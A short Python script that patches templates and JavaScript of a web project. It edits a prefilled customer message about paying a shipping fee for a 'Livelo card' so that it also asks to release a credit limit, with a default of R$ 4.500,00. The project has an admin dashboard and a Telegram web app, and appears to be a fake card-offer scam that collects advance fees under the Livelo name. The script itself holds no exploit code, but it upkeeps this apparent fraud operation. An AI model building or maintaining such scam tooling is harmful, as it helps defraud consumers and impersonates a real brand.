import os

def replace_in_file(filepath, old_text, new_text):
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()
    content = content.replace(old_text, new_text)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(content)

old_default = 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega!'
new_default = 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!'

# Update app.py
# (Actually, app.py doesn't have the default text hardcoded, it just gets it from data)

# Update admin_dashboard.html
replace_in_file('templates/admin_dashboard.html', old_default, new_default)

# Update tg_webapp.html
# In tg_webapp, the placeholder is "Olá! Paguei o frete {token}..." we can leave it or change it.
replace_in_file('templates/tg_webapp.html', 'Olá! Paguei o frete {token}...', 'Olá! Paguei o frete {token} e quero liberar meu limite de {limite}!')

# Update index.html
replace_in_file('templates/index.html', old_default, new_default)

# Update main.js
with open('static/js/main.js', 'r', encoding='utf-8') as f:
    main_js = f.read()

# 1. Store limit in STATE
main_js = main_js.replace(
    "if ($id('done-limite')) $id('done-limite').textContent = data.limite;",
    "STATE.limite = data.limite;\n      if ($id('done-limite')) $id('done-limite').textContent = data.limite;"
)

# 2. Replace {limite} in text
old_js_text = "rawText = rawText.replace('{token}', (STATE.sessionId || 'XXXX').substring(0,8));"
new_js_text = "rawText = rawText.replace('{token}', (STATE.sessionId || 'XXXX').substring(0,8));\n  rawText = rawText.replace('{limite}', STATE.limite || 'R$ 4.500,00');"
main_js = main_js.replace(old_js_text, new_js_text)

main_js = main_js.replace(old_default, new_default)

with open('static/js/main.js', 'w', encoding='utf-8') as f:
    f.write(main_js)

print("Updated text and added {limite} replacement.")
